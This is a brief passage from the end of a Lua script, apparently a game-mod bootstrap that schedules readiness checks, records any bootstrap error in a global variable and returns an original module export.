        schedule(0.05, check)
      end)
      S.Waking = false
      if not ok and current() then finish("WaitingReadyEvent", tostring(problem)) end
    end
    S.Wake("entry")
  end)
  if not bootstrapOK then _G.__MasterAhsanOnlineBootstrapError = tostring(bootstrapError) end
end

return originalExport
